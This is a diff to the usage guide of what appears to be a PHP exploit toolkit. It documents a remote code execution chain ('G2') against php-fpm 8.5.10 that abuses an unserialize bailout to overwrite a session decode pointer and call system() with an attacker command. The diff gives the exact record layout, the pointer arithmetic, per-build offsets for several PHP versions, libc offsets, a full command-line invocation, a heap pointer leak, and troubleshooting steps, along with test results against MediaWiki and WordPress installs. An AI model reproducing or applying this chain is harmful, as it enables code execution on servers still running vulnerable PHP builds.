@@ -1,6 +1,6 @@
 # USAGE
 
-Install, layout and run one-liners: see `README.md`. This file is the lane matrix, prerequisites and failure diagnosis.
+Install, layout and run one-liners: see `README.md`. This file is the lane matrix, the G2 plan, prerequisites, version matrix and failure diagnosis.
 
 ## Lane matrix
 
@@ -8,7 +8,10 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 |---|---|---|---|---|---|
 | modphp machinery | libphp.so PHP 8.5.10 NTS, httpd prefork | `producer_modphp` filename length N ladder | tiny multipart plus GET arms | HTTP 200, 149 B fatal transcript, worker survives | dry wired, live gated |
 | modphp app unserialize | lab unserialize endpoint | `producer_unser` master shape class payload | tiny multipart plus GET arms | HTTP 200, fatal transcript at the class tried alloc, worker survives | dry wired, live gated by `--unser-url` |
-| fpm wiki and wp | php-fpm static pool | post startup app level fatal inside the unserialize family | small arm under the pool memory_limit | worker survives an app fatal, machinery fatal exits 70 | prerequisites table below |
+| fpm app fatal | php-fpm 8.5.10 static pool | post startup app level fatal inside the unserialize family | none | worker exits 70, no access row | measured, not a route by itself |
+| fpm G2 decode hijack | php-fpm 8.5.10 ET_EXEC, ASLR off | `E_USER_ERROR` bailout inside `unserialize` | multipart session record plus forced END decode | marker created, worker survives, decode pointer overwritten | confirmed lab, offline `--step g2` |
+| modphp in band leak | libphp.so PHP 8.5.10 NTS PIE | M5 plant and trigger | `sidlen` / `sidhex` overread | live session array pointer over HTTP, 4 of 4 runs | measured, `leak_offset` build specific |
+| real apps | MediaWiki/Wikibase, WordPress/WooCommerce | anonymous app request | app specific | Wikibase fatal and worker survival, WP 1 of 4 consumers SIGSEGV | reachability and availability, no RCE |
 
 ## Prerequisites
 
@@ -24,6 +27,96 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | `session.use_only_cookies` | 1, the sid travels in the Cookie header | `info.php` receipt |
 | fpm `fastcgi_request_buffering` | off, so client body pauses reach the pool | blueprint section F.3 |
 | fpm `session.upload_progress.min_freq` | 1 s default, the body stall must exceed it | blueprint section F.3 |
+
+## Step map
+
+| step | sends | output |
+|---|---|---|
+| `recon` | one GET when `--live` is set | fingerprint and addresses |
+| `producer` | no, unless `--live` | request bytes and `result.json` |
+| `write_stage` | never | final forged multipart bytes |
+| `leak` | never | dry modphp calibration plan |
+| `g2` | never | `g2-record.bin` and plan JSON |
+| `chain` | modphp sequence dry by default; fpm legacy path is live | per-candidate receipt |
+
+## G2 plan
+
+G2 is the confirmed FPM route on the plain PHP 8.5.10 build. A controlled bailout
+leaves a stale `BG(unserialize)` dtor chain. The pre RINIT upload progress session
+decode reuses it, and the typed zval write reaches `ps_serializers[2].decode` in
+`.data`. The forced END decode then calls the overwritten pointer with the session
+record bytes as `rdi`.
+
+Inputs, all explicit:
+
+| flag | meaning | default |
+|---|---|---|
+| `--g2-x` | session record buffer `zend_string` X | required |
+| `--g2-p` | stale `php_unserialize_data` P | required |
+| `--g2-b0` | stale `var_dtor_entries` B0 | required |
+| `--g2-total` | session record length | profile lab geometry, 131014 |
+| `--g2-target` | 16 byte aligned write target | `ps_serializers[2].decode`, 0x14c1b60 |
+| `--g2-value` | serialized long written at the target | `i:1;` |
+| `--libc-base` | libc base; `system = base + 0x53090` | none |
+| `--command` | shell command, padded to 32 bytes, must end `#` | `id;exit;#` |
+
+`--g2-value` and `--libc-base` are mutually exclusive. The profile binds the
+system offset `0x53090` to the lab glibc; the binary imports no `system` symbol,
+only `popen`, `execvp`, `fork` and `posix_spawn` PLT entries.
+
+Arithmetic and record shape:
+
+```
+used_slots = (target - (B0 + 0x10)) / 16
+slot       = B0 + 0x10 + 16 * used_slots
+second     = target + 16
+type zero  = target + 8 and target + 24
+record     = [0x20][32 byte command][i:<n>;] + [0x01]['z']s:<L>:"<payload>";
+payload    = fake php_unserialize_data at P - (X + 24)
+             fake var_dtor_entries at B0 - (X + 24)
+```
+
+The fake P carries `last=P+56`, `first_dtor=last_dtor=B0`, `max_depth=0x7fffffff`
+and `entries.used_slots=1018`. The fake B0 carries `used_slots=K` and `next=0`.
+The command padding rule is required because the 0x20 key length byte is also
+the leading space of the shell command; the trailing `#` comments out the
+serialized long that follows.
+
+Example, receipt geometry and libc base:
+
+```sh
+python3 -m tool --step g2 \
+  --g2-x 0x7ffff7a6a000 --g2-p 0x7ffff7a81000 --g2-b0 0x7ffff7a84000 \
+  --g2-total 131014 --command 'touch /tmp/fpmgadget_sys;exit;#' \
+  --libc-base 0x7ffff7c9c000 --output files/io/g2-receipt
+```
+
+Expected record: 131014 bytes, sha256
+`373b4bb1dabda7e4417942ef0b1cd75bbe3880f83b4d1b10187cf66708e075e8`,
+`used_slots -8796082913867`, `p_off 94184`, `b_off 106472`, `payload_start 63`,
+`L 130949`, `system 0x7ffff7cef090`.
+
+Self-checks run before the record is written: 32 byte key, serialized long,
+target 16 byte alignment, negative `used_slots`, second slot below B0, fake P
+and fake B0 inside the payload, record length convergence. A failed check or a
+missing address exits 2 with the reason in `result.json`.
+
+G2 preconditions and limits:
+
+| item | requirement |
+|---|---|
+| binary | non PIE so the table is fixed, or a binary base leak; the profile is one build |
+| libc | base for `system`, or a fixed target that accepts `(char *, size_t)`; the fixed target route is not demonstrated |
+| heap | X, P, B0 and the exact record length |
+| FPM setup | upload progress on with the forced END update in the same request |
+| ordering | the plant request must be the immediately preceding request on the same worker |
+| retries | single shot per plant; the corrupt decode pointer persists until worker restart |
+| ASLR | off in the lab; the ASLR capable heap leak is open (F14) |
+
+Confirmed in two plant runs (n=7, n=11), same worker, marker created. A wrong X
+either leaves the plant chain in place or crashes `var_push`; a wrong record
+length can crash the second decode. No claim is made for other session savers,
+opcache, ZTS or shared pools.
 
 ## modphp machinery lane
 
@@ -54,6 +147,36 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | body stall | `fastcgi_request_buffering off`, pause above `session.upload_progress.min_freq` 1 s | blueprint section F.3 |
 | wp producer data | attacker controlled serialized string persisted on the server (user meta, transients) | blueprint section F.2 |
 
+## Version matrix
+
+| branch | audited vulnerable | first fixed | note |
+|---|---|---|---|
+| 8.5 | 8.5.10 (live), 8.5.11 (source) | 8.5.12 | `php_basic_early_rinit` resets `BG(unserialize)` before `sapi_activate` |
+| 8.4 | 8.4.25 (source) | 8.4.27 | 8.4.26 is structurally identical to 8.4.25 |
+| 8.3 | 8.3.27 (source) | 8.3.36 | same early reset |
+| 8.2 | 8.2.29 (source) | 8.2.35 | same early reset |
+| 8.1, 8.0, 7.x, 5.x | EOL, unpatched | none | 7.4.33 write reproduced 4/4 |
+
+G2 offsets by build, keyed by binary, not by version:
+
+| version | decode target A | PS(serializer) | ELF | evidence |
+|---|---|---|---|---|
+| 8.5.10 | 0x14c1b60 | 0x14c6160 | ET_EXEC | live G2, marker created |
+| 8.4.25 | 0xe01180 | 0xe03a60 | ET_EXEC | static derivation, no live run |
+| 8.1.34 | 0xe01140 | 0xe02fb0 | ET_EXEC | static derivation, no live run |
+| 7.4.33 | 0xe010a0 | 0xe02df0 | ET_EXEC | static derivation, writeport 4/4 |
+
+The fix does not remove the write primitive; it removes the stale global that
+lets the attacker choose P and B0. `ps_serializers` and `ps_globals` are build
+specific, so key on md5 or build id.
+
+## Real targets
+
+| app | request | result |
+|---|---|---|
+| MediaWiki 1.46.2 + Wikibase REL1_46 | anonymous `action=parse`, `contentmodel=wikibase-item`, `contentformat=application/vnd.php.serialized` | 52,065 B blob exhausts 1 GiB inside `php_var_unserialize_internal` at depth 1,533; HTTP 500; the FPM child survives and serves the next request on the same PID; `BG(unserialize).level=1` and the dtor chain survive into the next request |
+| WordPress 7.1.3 + WooCommerce 11.2.1 | guest classic checkout, 12 address fields, 84 MiB synthetic pressure, WCS sink replica | producer OOM inside `unserialize`; the next multipart consumer writes into the stale dtor block; 1 of 4 consumers died with SIGSEGV (502), 3 of 4 returned 200; the sink is a labeled replica because paid WCS 9.0.0 was not on disk; no RCE claimed |
+
 ## Fingerprint and profile pack
 
 | item | behavior | numbers |
@@ -61,9 +184,12 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | `--step recon` | GET the path, record status, server, connection, content type and body bytes | exit 0 alive, exit 2 not alive |
 | disclosure gate | 14 B frozen profile disclosure at LEAK_OFFSET inside a main chunk | LEAK_OFFSET 0x57030, main chunk 0x200000 |
 | `--step leak` | dry calibration plan, request shapes plus algorithm, no transport | 10 exchanges per stage, 3 stable triples, 4096 B Set-Cookie cap, approx 98 encoded pointers |
+| `leak_offset` | decoded session array minus Zend chunk base, measured on libphp md5 `92f76e84a77bf8b56c45c3868fa29a6c` | 0x2188 = heap + 0x2148, heap = chunk + 0x40; 4 of 4 runs, ASLR on; build and mapping specific, not a universal constant |
+| leak binding scope | the channel is the in-band `sidlen` / `sidhex` overread, not the Set-Cookie PS(id) channel | the Set-Cookie PS(id) offset is not separately measured; `target_offset` remains `TBD_from_leak_chunk_anchor` |
 | address profile | `addresses/apache_libphp.json`, per binary offsets and lane | 40492240 B, md5 `92f76e84a77bf8b56c45c3868fa29a6c`, p_align 0x1000 |
 | five resolved symbols | `zif_system` 0x40cc80, `zif_passthru` 0x40cc90, `zend_call_function` 0x540500, `zend_llist_remove_tail` 0x5d39a0, `zval_ptr_dtor` 0x5f0980 | deltas 0xb0480 and 0x1c6d10 |
 | engine symbols | `php_url_encode` 0x460d70, `ps_globals` 0xa3b020, `basic_globals` 0xa3bdc0, `php_apache_sapi_ub_write` 0x5f7ee0, `zend_rc_dtor_func` 0x96f760 | PS(id) offset 16, PS(http_session_vars) offset 360 |
+| G2 profile | `addresses/g2_fpm_8510.json` | table 0x14c1b20, `php_binary` decode 0x14c1b60, call `*0x10(%rax)` at 0x83db66, libc system 0x53090 |
 | profile pack build | `universal/profile_builder.py` reads `nm` and `readelf` and writes `addresses/*.json` | new target needs `profiles.py` TARGETS plus BINARY_PROFILES |
 
 ## Failure diagnosis
@@ -76,3 +202,10 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | modphp assumptions fail on FPM | SAPI mismatch; machinery OOM kills the FPM worker with exit 70 | phpinfo Server API | use the fpm app level producer plus the small arm |
 | arm returns `0` with no OOM | modphp `memory_limit` knob absent or 128M build default | phpinfo `memory_limit` | set the knob, the producer refuses pre flight |
 | same sid requests time out | session file flock queue | session save path lock holders | use a fresh sid except in the deliberate stale stage |
+| g2 exits 2, missing address | X, P or B0 not supplied | `result.json` error lists the missing flag | pass all three; the plan never guesses |
+| g2 exits 2, no transport | `--live` passed to an offline step | `result.json` says no transport | drop `--live` |
+| g2 command error | command does not end `#` or is longer than 32 bytes | `result.json` error | trim and end with `#` |
+| g2 target error | target not 16 byte aligned, or not reachable from B0 | `result.json` error | use an aligned target below B0 + 0x10 |
+| g2 P or B0 outside payload | wrong X or total | check `p_off`, `b_off`, `payload_start` in `result.json` | re-measure X or the record length |
+| g2 record checks fail | second slot above B0 or length does not converge | `result.json` checks | re-check the direction and total |
+| g2 wrong build | offsets are build specific | compare md5 or build id with the profile | re-derive the profile, do not reuse offsets |
